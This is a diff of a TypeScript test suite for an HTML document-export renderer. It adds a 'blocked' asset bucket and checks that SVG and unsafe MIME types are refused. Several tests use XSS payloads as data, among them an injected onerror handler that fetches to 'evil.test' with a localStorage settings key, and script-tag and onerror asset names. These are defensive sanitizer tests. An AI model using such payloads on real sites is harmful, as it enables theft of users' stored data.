@@ -7,6 +7,7 @@ import type { ExportAssets } from "./document-export-assets";
 import { PRINT_STYLES } from "./download";
 import { ASSET_MIME_ALLOWED } from "./document-asset-upload";
 import { DEFAULT_EXPORT_FOOTER } from "./export-footer";
+import { t } from "./i18n";
 
 // A Workspace has ~30 required slices and this renderer reads only the ones the
 // section builders touch, so one narrow cast beats constructing the whole shape.
@@ -408,7 +409,7 @@ describe("renderDocumentHtml — S3c-1 image inlining", () => {
 
   it("does nothing in preview mode, even when assets are supplied", () => {
     const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
-    const withAssets = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "preview", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
+    const withAssets = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "preview", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     const withoutAssets = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "preview");
     expect(withAssets).toBe(withoutAssets);
     expect(withAssets).not.toContain("base64");
@@ -430,7 +431,7 @@ describe("renderDocumentHtml — S3c-1 image inlining", () => {
 
   it("standalone inlines a known asset as a base64 data: URI, using the mime from ws.documentAssets", () => {
     const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
-    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     expect(html).toContain('src="data:image/png;base64,QUJD"');
     expect(html).toContain('data-asset-id="a1"');
     expect(html).not.toContain(`data-asset-missing="true"`);
@@ -438,7 +439,7 @@ describe("renderDocumentHtml — S3c-1 image inlining", () => {
 
   it("marks a referenced id absent from the assets map as missing, without a src", () => {
     const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
-    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: {}, omitted: new Set(), missing: new Set() });
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: {}, omitted: new Set(), missing: new Set(), blocked: new Set() });
     expect(html).toContain('data-asset-missing="true"');
     expect(html).not.toContain("src=");
   });
@@ -448,7 +449,7 @@ describe("renderDocumentHtml — S3c-1 image inlining", () => {
   // wrong or absent MIME is a content-sniffing gamble, not a safe fallback.
   it("marks an id present in the assets map as missing when no mime is known for it", () => {
     // ws carries no documentAssets metadata for "a1" at all.
-    const html = renderDocumentHtml(doc([...withImage]), ws, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
+    const html = renderDocumentHtml(doc([...withImage]), ws, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     expect(html).toContain('data-asset-missing="true"');
     expect(html).not.toContain("src=");
     expect(html).not.toContain("base64");
@@ -471,13 +472,46 @@ describe("renderDocumentHtml — S3c-1 image inlining is validated at the SINK",
   /** Parse the rendered standalone HTML and hand back the asset <img>. */
   function renderedImg(mime: string, data: string): HTMLImageElement {
     const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", mime)] } as Workspace;
-    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: data }, omitted: new Set(), missing: new Set() });
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: data }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     const host = document.createElement("div");
     host.innerHTML = html.slice(html.indexOf("<body>") + "<body>".length);
     const img = host.querySelector("img[data-asset-id]");
     expect(img).not.toBeNull();
     return img as HTMLImageElement;
   }
+
+  /** The standalone body, parsed. */
+  function renderedBody(mime: string, data: string, name = "a1.png"): HTMLElement {
+    const wsWithAsset = { ...ws, documentAssets: [{ ...assetMeta("a1", mime), name }] } as Workspace;
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone",
+      { inlined: { a1: data }, omitted: new Set(), missing: new Set(), blocked: new Set() });
+    const host = document.createElement("div");
+    host.innerHTML = html.slice(html.indexOf("<body>") + "<body>".length);
+    return host;
+  }
+
+  // §320 — even when the caller classified nothing (the id sits in `inlined`),
+  //  a stored mime outside the allowlist is REFUSED, and the reader is told so.
+  it("renders the blocked placeholder for image/svg+xml instead of a missing box", () => {
+    const body = renderedBody("image/svg+xml", "QUJD", "diagram.svg");
+    const span = body.querySelector("span[data-asset-blocked]");
+    expect(span?.textContent).toBe(t("en-US", "assetExportBlocked", "diagram.svg"));
+    expect(body.querySelector("img[data-asset-id]")).toBeNull();
+    expect(body.innerHTML).not.toContain("data:image/svg");
+  });
+
+  it("renders the blocked placeholder from the blocked bucket too", () => {
+    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone",
+      { inlined: {}, omitted: new Set(), missing: new Set(), blocked: new Set(["a1"]) });
+    expect(html).toContain('data-asset-blocked="true"');
+    expect(html).not.toContain('data-asset-missing="true"');
+  });
+
+  it("ships a stylesheet rule for the blocked placeholder", () => {
+    const html = renderDocumentHtml(doc([...withImage]), ws, "en-US", "standalone");
+    expect(html).toContain("span[data-asset-blocked]");
+  });
 
   it("renders the data: URI for an allowed mime", () => {
     const img = renderedImg("image/png", "QUJD");
@@ -491,21 +525,23 @@ describe("renderDocumentHtml — S3c-1 image inlining is validated at the SINK",
     }
   });
 
-  it("falls through to data-asset-missing for a quote-injection mime, minting no event handler", () => {
+  it("refuses a quote-injection mime as blocked, minting no event handler (§320)", () => {
     const hostile =
       `image/png" onerror="fetch('https://evil.test/'+localStorage.getItem('aipm-cockpit:settings'))`;
-    const img = renderedImg(hostile, "QUJD");
-    expect(img.getAttribute("onerror")).toBeNull();
-    expect(img.getAttribute("src")).toBeNull();
-    expect(img.getAttribute("data-asset-missing")).toBe("true");
+    const body = renderedBody(hostile, "QUJD");
+    expect(body.querySelector("[onerror]")).toBeNull();
+    expect(body.querySelector("span[data-asset-blocked]")).not.toBeNull();
+    expect(body.querySelector("img[data-asset-id]")).toBeNull();
   });
 
-  it("falls through for image/svg+xml — escaping alone would still leave an XSS surface", () => {
-    // The upload allowlist excludes SVG; the load path does not, so the sink
-    // must exclude it independently.
-    const img = renderedImg("image/svg+xml", "QUJD");
-    expect(img.getAttribute("src")).toBeNull();
-    expect(img.getAttribute("data-asset-missing")).toBe("true");
+  // §320 — the placeholder is interpolated AFTER `sanitizeDocumentHtml`, so a
+  //  hostile display name must arrive as TEXT, never as markup.
+  it("escapes a hostile asset name in the blocked placeholder", () => {
+    const name = `<img src=x onerror="alert(1)">.svg`;
+    const body = renderedBody("image/svg+xml", "QUJD", name);
+    expect(body.querySelector("[onerror]")).toBeNull();
+    expect(body.querySelector("span[data-asset-blocked]")?.textContent)
+      .toBe(t("en-US", "assetExportBlocked", name));
   });
 
   it("falls through when data is not base64 — the Turso column validates no charset", () => {
@@ -560,7 +596,9 @@ describe("renderDocumentHtml — S3c-1 image inlining is validated at the SINK",
 // not here); `missing` means there is no byte row or the load failed (a DATA
 // problem). Presenting an omitted image with the broken-image marker tells a
 // user their image is lost when it is not, so the two branches must stay
-// distinguishable in the output, not merely in the type.
+// distinguishable in the output, not merely in the type. (§320 added a fourth
+// bucket, `blocked` — the type is refused; its branches are pinned in the S3c-1
+// sink block above.)
 describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
   const PNG_B64 = "iVBORw0KGgo=";
 
@@ -584,13 +622,13 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
     renderDocumentHtml(docWith(IMG), wsWithAsset(name), "en-US", "standalone", assets);
 
   it("inlines a data: URI when the asset is inlined", () => {
-    const out = html({ inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() });
+    const out = html({ inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     expect(out).toContain(`src="data:image/png;base64,${PNG_B64}"`);
     expect(out).not.toContain(`data-asset-missing="true"`);
   });
 
   it("substitutes the SAME placeholder text as docx when omitted by budget", () => {
-    const out = html({ inlined: {}, omitted: new Set(["a1"]), missing: new Set() });
+    const out = html({ inlined: {}, omitted: new Set(["a1"]), missing: new Set(), blocked: new Set() });
     expect(out).toContain("[Image: chart.png]");
     // An omitted image is a policy decision, not a broken one.
     expect(out).not.toContain(`data-asset-missing="true"`);
@@ -608,7 +646,7 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
   // execution. Drop the escape and this test goes red.
   it("escapes the asset name in the placeholder — the substitution runs post-sanitize", () => {
     const out = html(
-      { inlined: {}, omitted: new Set(["a1"]), missing: new Set() },
+      { inlined: {}, omitted: new Set(["a1"]), missing: new Set(), blocked: new Set() },
       `<script>alert(1)</script>.png`,
     );
     expect(out).not.toContain("<script>");
@@ -616,7 +654,7 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
   });
 
   it("marks a missing asset, and the standalone stylesheet can draw the marker", () => {
-    const out = html({ inlined: {}, omitted: new Set(), missing: new Set(["a1"]) });
+    const out = html({ inlined: {}, omitted: new Set(), missing: new Set(["a1"]), blocked: new Set() });
     expect(out).toContain(`data-asset-missing="true"`);
     // ★ The marker is styled ONLY in globals.css, which a standalone file never
     // loads — so the rule must be inlined here or the attribute draws nothing.
@@ -631,7 +669,7 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
   // neither visibly inlined, nor omitted, nor missing — and a `src="data:…;
   // base64,"` would render nothing at all with no explanation.
   it("declines an empty base64 string rather than emitting a src that renders nothing", () => {
-    const out = html({ inlined: { a1: "" }, omitted: new Set(), missing: new Set() });
+    const out = html({ inlined: { a1: "" }, omitted: new Set(), missing: new Set(), blocked: new Set() });
     expect(out).not.toContain(`src="data:`);
     expect(out).toContain(`data-asset-missing="true"`);
   });
@@ -661,7 +699,7 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
         wsWithAsset(),
         "en-US",
         "standalone",
-        { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() },
+        { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set(), blocked: new Set() },
       );
       const host = document.createElement("div");
       host.innerHTML = out.slice(out.indexOf("<body>") + "<body>".length);
@@ -682,7 +720,7 @@ describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
       wsWithAsset(),
       "en-US",
       "preview",
-      { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() },
+      { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set(), blocked: new Set() },
     );
     expect(out).not.toContain("data:image/png");
     expect(out).toContain(`data-asset-id="a1"`);
